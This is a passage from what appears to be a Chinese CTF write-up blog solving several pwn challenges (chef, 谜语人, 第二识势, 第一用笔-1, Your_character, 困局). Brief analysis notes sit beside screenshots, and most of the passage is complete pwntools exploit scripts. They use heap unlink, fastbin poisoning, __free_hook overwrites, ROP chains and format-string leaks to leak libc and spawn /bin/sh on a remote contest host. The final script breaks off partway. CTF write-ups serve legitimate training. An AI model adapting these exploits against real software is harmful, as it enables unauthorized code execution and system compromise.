pay=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64(fd)+p64(bk)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0xa0</span>)
edit(<span class="hljs-number">4</span>,pay)

dele(<span class="hljs-number">5</span>)

edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]))

edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x4008FE</span>))

p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)

p.interactive()</code></pre>
<h2 id="chef"><a href="#chef" class="headerlink" title="chef"></a>chef</h2><ol>
<li>分析<br><img src="https://img-blog.csdnimg.cn/3f87223f5b6d461daf67058ae58b9eaa.png#pic_center" alt="在这里插入图片描述"><br>用 checksec 工具分析程序<br><img src="https://img-blog.csdnimg.cn/0ef34fb5352f40809775408b2c1c6498.png" alt="在这里插入图片描述"><br>再用 ida 看源码<br><img src="https://img-blog.csdnimg.cn/0daa62f428b640428707b5ecd4f7457a.png#pic_center" alt="在这里插入图片描述"></li>
<li>exp</li>
</ol>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
<span class="hljs-comment">#io=process(&quot;./chef&quot;)</span>
io=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10031</span>)
elf=ELF(<span class="hljs-string">&quot;./chef&quot;</span>)
r = <span class="hljs-keyword">lambda</span> : io.recv()
rx = <span class="hljs-keyword">lambda</span> x: io.recv(x)
ru = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x)
rud = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x, drop=<span class="hljs-literal">True</span>)
uu64= <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
s = <span class="hljs-keyword">lambda</span> x: io.send(x)
sl = <span class="hljs-keyword">lambda</span> x: io.sendline(x)
sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)
sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)
shell = <span class="hljs-keyword">lambda</span> : io.interactive()
libc=elf.libc
sl(<span class="hljs-string">b&quot;4&quot;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):
sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">b&quot;2&quot;</span>)
sla(<span class="hljs-string">&quot;Please enter the price of food:&quot;</span>,<span class="hljs-built_in">str</span>(size))
sa(<span class="hljs-string">&quot;Please enter the name of food:&quot;</span>,content)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():
sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):
sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
sla(<span class="hljs-string">&quot;Please enter the index of food:&quot;</span>,<span class="hljs-built_in">str</span>(index))
sla(<span class="hljs-string">&quot;Please enter the price of food :&quot;</span>,<span class="hljs-built_in">str</span>(size))
sa(<span class="hljs-string">&quot;Please enter the name of food:&quot;</span>,content)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):
sla(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
sla(<span class="hljs-string">&quot;Please enter the index of food:&quot;</span>,<span class="hljs-built_in">str</span>(index))
<span class="hljs-comment">#gdb.attach(io)</span>
ptr=<span class="hljs-number">0x6020b8</span>
add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)
payload=payload.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)
payload+=p64(<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x90</span>)
edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)
delete(<span class="hljs-number">2</span>)
edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0x50</span>)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))
show()
leak_addr=uu64()
libc_base=leak_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))
system_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0x50</span>)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x50</span>)+p64(free_hook))
edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(system_addr))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))
delete(<span class="hljs-number">3</span>)
shell()</code></pre>
<h2 id="谜语人"><a href="#谜语人" class="headerlink" title="谜语人"></a>谜语人</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> gmpy2
<span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):
 p.send(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):
 p.sendafter(a, b)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):
 p.sendline(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):
 p.sendlineafter(a, b)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():
 p.recv()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():
 <span class="hljs-built_in">print</span>(p.recv())
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):
 <span class="hljs-keyword">return</span> p.recvuntil(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():
 p.interactive()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():
 gdb.attach(p)
 pause()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
 <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():
 <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
<span class="hljs-comment">#p = remote(&#x27;59.110.164.72&#x27;, 10028)</span>
elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
libc = ELF(<span class="hljs-string">&#x27;libc.so&#x27;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx</span>):
sla(<span class="hljs-string">b&#x27;Then?\n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
sla(<span class="hljs-string">b&#x27;?!\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
sla(<span class="hljs-string">b&#x27;Then?\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
sla(<span class="hljs-string">b&#x27;?!\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
sla(<span class="hljs-string">b&#x27;Then?\n&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)
sla(<span class="hljs-string">b&#x27;?!\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, data</span>):
sla(<span class="hljs-string">b&#x27;Then?\n&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)
sla(<span class="hljs-string">b&#x27;?!\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))
sleep(<span class="hljs-number">0.5</span>)
sl(data)
<span class="hljs-comment"># leak heap_addr</span>
add(<span class="hljs-number">3</span>)
add(<span class="hljs-number">4</span>)
free(<span class="hljs-number">4</span>)
edit(<span class="hljs-number">4</span>, p64(<span class="hljs-number">0</span>))
free(<span class="hljs-number">4</span>)
show(<span class="hljs-number">4</span>)
heap_addr = u32(p.recv(<span class="hljs-number">4</span>))
ptr_heap = heap_addr - <span class="hljs-number">0x1048</span> + <span class="hljs-number">0x8</span>
<span class="hljs-comment"># leak libc_base</span>
edit(<span class="hljs-number">4</span>, p32(ptr_heap))
add(<span class="hljs-number">5</span>)
add(<span class="hljs-number">6</span>)
free(<span class="hljs-number">6</span>)
show(<span class="hljs-number">6</span>)
p.recv(<span class="hljs-number">4</span>)
libc_base = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">56</span> - <span class="hljs-number">0x8</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]
<span class="hljs-comment"># free_hook -&gt; system</span>
free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
system, binsh = get_sb()
free(<span class="hljs-number">3</span>)
edit(<span class="hljs-number">3</span>, p64(<span class="hljs-number">0</span>))
free(<span class="hljs-number">3</span>)
edit(<span class="hljs-number">3</span>, p32(free_hook))
add(<span class="hljs-number">7</span>)
add(<span class="hljs-number">8</span>)
edit(<span class="hljs-number">8</span>, p32(system))
<span class="hljs-comment"># pwn</span>
edit(<span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;sh;\x00&#x27;</span>)
free(<span class="hljs-number">7</span>)
inter()
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; free_hook -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(free_hook))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; libc_base -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; ptr_heap -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(ptr_heap))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; heap_addr -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(heap_addr))
<span class="hljs-comment">#debug()</span></code></pre>
<h2 id="第二识势"><a href="#第二识势" class="headerlink" title="第二识势"></a>第二识势</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.arch=<span class="hljs-string">&quot;amd64&quot;</span>
<span class="hljs-comment">#io=process(&quot;./attachment-34&quot;)</span>
io=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10025</span>)
elf=ELF(<span class="hljs-string">&quot;./attachment-34&quot;</span>)
r = <span class="hljs-keyword">lambda</span> : io.recv()
rx = <span class="hljs-keyword">lambda</span> x: io.recv(x)
ru = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x)
rud = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x, drop=<span class="hljs-literal">True</span>)
uu64= <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
s = <span class="hljs-keyword">lambda</span> x: io.send(x)
sl = <span class="hljs-keyword">lambda</span> x: io.sendline(x)
sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)
sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)
shell = <span class="hljs-keyword">lambda</span> : io.interactive()
<span class="hljs-comment">#libc=elf.libc</span>
libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
<span class="hljs-comment">#gdb.attach(io)</span>
sl(<span class="hljs-string">b&quot;6\x00666666666666666666666&quot;</span>)
ru(<span class="hljs-string">&quot;materials\n&quot;</span>)
leak_addr=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">8</span>))
heap_addr=leak_addr-<span class="hljs-number">0x13</span>+<span class="hljs-number">0x20</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))
sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0xfffffffffff</span>))
target=<span class="hljs-number">0x6012Af</span>
sl(<span class="hljs-built_in">str</span>(target-heap_addr-<span class="hljs-number">0x20</span>))
pause()
s(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xf</span>+<span class="hljs-string">b&#x27;\x61&#x27;</span>)
<span class="hljs-comment">#b *0x400B39</span>
addr=<span class="hljs-number">0x4008a7</span>
bsf=<span class="hljs-number">0x6012A0</span>
leave_ret=<span class="hljs-number">0x400944</span>
rdi=<span class="hljs-number">0x400bd3</span>
ret=<span class="hljs-number">0x4006e6</span>
magic_gadget_addr=<span class="hljs-number">0x400888</span>
csu_low=<span class="hljs-number">0x400BCa</span>
one_gadget=<span class="hljs-number">0xf1247</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_to</span>(<span class="hljs-params">addr,data</span>):
 pd = flat([
 csu_low,
 data,
 addr + <span class="hljs-number">0x3d</span>,
 <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,
 magic_gadget_addr
 ])
 <span class="hljs-keyword">return</span> pd
payload=set_to(<span class="hljs-number">0x601250</span>,one_gadget-libc.sym[<span class="hljs-string">&#x27;setvbuf&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;setvbuf&#x27;</span>])
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))
payload=payload.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(bsf-<span class="hljs-number">8</span>)+p64(leave_ret)
pause()
sl(payload)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;setvbuf&#x27;</span>]))
shell()</code></pre>
<h2 id="第一用笔-1"><a href="#第一用笔-1" class="headerlink" title="第一用笔-1"></a>第一用笔-1</h2><ol>
<li>分析<br><img src="https://img-blog.csdnimg.cn/8987e508ee3044d6b3251b49d7bab88a.png#pic_center" alt="在这里插入图片描述"><br>用 checksec 工具分析程序<br><img src="https://img-blog.csdnimg.cn/4c647ea2dae84717ae89ca65e5fe78bb.png" alt="在这里插入图片描述"><br>再用 ida 看源码<br><img src="https://img-blog.csdnimg.cn/80d141f26a974f9fb825a90b21c27044.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4188a0166e824957875b37db4a92ca04.png" alt="在这里插入图片描述"></li>
</ol>
<p>存在一个栈溢出很大的函数可以利用<br><img src="https://img-blog.csdnimg.cn/941739477b4f4f8d985d92a581a863c1.png" alt="在这里插入图片描述"></p>
<p>可以用 main 的 fun_2 函数栈溢出来调用那个更大的栈溢出函数来布置栈帧，还要泄露<br>地址来计算基砋来调用 libc 的 system 函数<br>2.  exp</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># -*- coding=utf-8 -*-</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> os
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
elf = ELF(<span class="hljs-string">&quot;./usage_of_pen&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
DEBUG = <span class="hljs-number">0</span>
pop_rdi = <span class="hljs-number">0x0000000000400c53</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">p</span>):
 p.recvuntil(<span class="hljs-string">b&quot;and 40 to 47 is &#x27;nvfeng00&#x27;!\n&quot;</span>)
 payload = <span class="hljs-string">b&quot;&quot;</span>
 payload += <span class="hljs-string">b&quot;dunbi000&quot;</span>
 payload += <span class="hljs-string">b&quot;cuobi&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;yufeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;dunfeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;cunfeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;nvfeng00&quot;</span>
 payload += <span class="hljs-string">b&quot;yuefeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;anfeng&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 payload += <span class="hljs-string">b&quot;jiebi&quot;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;0&quot;</span>)
 p.send(payload)
 p.recvuntil(<span class="hljs-string">&quot;or you can look for other space\n&quot;</span>)
 payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x400B0F</span>)
 p.send(payload)
 payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]) + 
p64(<span class="hljs-number">0x400B0F</span>)
 <span class="hljs-comment"># pause()</span>
 sleep(<span class="hljs-number">0.5</span>)
 p.send(payload)
 puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
 libc.address = puts_addr - <span class="hljs-number">0x6f6a0</span>
 payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi) + p64(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()) + 
p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])
 <span class="hljs-comment"># pause()</span>
 sleep(<span class="hljs-number">0.5</span>)
 p.send(payload)
 p.interactive()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
 <span class="hljs-keyword">if</span> DEBUG:
 p = process(<span class="hljs-string">&quot;./usage_of_pen&quot;</span>)
 gdb.attach(p, <span class="hljs-string">&quot;source ./.gdbinit&quot;</span>)
 exp(p)
 <span class="hljs-keyword">else</span>:
 p = remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>, <span class="hljs-number">10002</span>)
 exp(p)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
 main()</code></pre>
<h2 id="Your-character"><a href="#Your-character" class="headerlink" title="Your_character"></a>Your_character</h2><ol>
<li>分析<br><img src="https://img-blog.csdnimg.cn/ffd68d53f4f04990b7cc759f2f540779.png" alt="在这里插入图片描述"><br>用 checksec 工具分析程序<br><img src="https://img-blog.csdnimg.cn/1717cd2e42a04fdcb16ce306f91eee24.png" alt="在这里插入图片描述"><br>再用 ida 看源码，是堆相关的漏洞<br><img src="https://img-blog.csdnimg.cn/312ec8c70e8245e393e427343d64e40a.png" alt="在这里插入图片描述"></li>
<li>exp</li>
</ol>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> os
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
elf = ELF(<span class="hljs-string">&quot;./your_character&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)
DEBUG = <span class="hljs-number">0</span>
bss_addr = <span class="hljs-number">0x6021C0</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">p</span>):
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">design</span>():
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;1&quot;</span>)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">background</span>(<span class="hljs-params">context</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;2&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Please enter the background story of your character: \n&quot;</span>)
 p.send(context)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">character</span>(<span class="hljs-params">idx, content</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;3&quot;</span>)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">damage, introduction</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;1&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Damage of skill : &quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(damage))
 p.recvuntil(<span class="hljs-string">&quot;introduction of skill:&quot;</span>)
 p.send(introduction)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_damage</span>(<span class="hljs-params">idx, damage</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;2&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(idx))
 p.recvuntil(<span class="hljs-string">&quot;Damage of skill : &quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(damage))
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_intro</span>(<span class="hljs-params">idx, introduction</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;3&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(idx))
 p.recvuntil(<span class="hljs-string">&quot;introduction of skill : &quot;</span>)
 p.send(introduction)
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;4&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(idx))
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;5&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)
 p.send(<span class="hljs-built_in">str</span>(idx))
 <span class="hljs-keyword">def</span> <span class="hljs-title function_">back</span>():
 p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)
 p.sendline(<span class="hljs-string">&quot;6&quot;</span>)
 design()
 create(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&quot;aaa&quot;</span>)<span class="hljs-comment">#0</span>
 create(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&quot;aaa&quot;</span>)<span class="hljs-comment">#1</span>
 create(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<span class="hljs-comment">#2</span>
 payload = <span class="hljs-string">b&quot;\x01&quot;</span>*<span class="hljs-number">0x18</span> + <span class="hljs-string">b&quot;\x41&quot;</span>
 edit_intro(<span class="hljs-number">0</span>, payload)
 delete(<span class="hljs-number">1</span>)
 payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0x100</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])
 create(<span class="hljs-number">0x38</span>, payload)
 show(<span class="hljs-number">1</span>)
 free_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
 libc.address = free_addr - <span class="hljs-number">0x84540</span>
 info(<span class="hljs-string">&quot;libc.address-----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))
 edit_intro(<span class="hljs-number">1</span>, p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>]))
 delete(<span class="hljs-number">2</span>)
 p.interactive()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
 <span class="hljs-keyword">if</span> DEBUG:
 p = process(<span class="hljs-string">&quot;./your_character&quot;</span>)
 gdb.attach(p, <span class="hljs-string">&quot;source ./.gdbinit&quot;</span>)
 exp(p)
 <span class="hljs-keyword">else</span>:
 p = remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>, <span class="hljs-number">10003</span>)
 exp(p)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
 main()</code></pre>
<h2 id="困局"><a href="#困局" class="headerlink" title="困局"></a>困局</h2><p>下载附件分析，发现main会调用两次func_key,func_key里有格式化字符串漏洞, func_1有一个足够长的溢出。<br>写exp:</p>
<pre><code class="hljs python">

libc_base=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]-<span class="hljs-number">240</span>
open_addr = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]

read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]
write_addr = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]
<span class="hljs-comment"># 0x000000000002601f : pop rsi ; ret</span>
pop_rsi = libc_base + <span class="hljs-number">0x00000000000202f8</span>
<span class="hljs-comment"># 0x0000000000142c92 : pop rdx ; ret</span>
pop_rdx = libc_base + <span class="hljs-number">0x0000000000001b92</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))
can=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(can))
stack=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">128</span>+<span class="hljs-number">48</span>+<span class="hljs-number">8</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))

p.recvuntil(<span class="hljs-string">&quot;This is a larger box\n&quot;</span>)
pay=<span class="hljs-string">b&#x27;%9$p&#x27;</span>
p.send(pay)
p.recvuntil(<span class="hljs-string">&quot;We have a lot to talk about\n&quot;</span>)
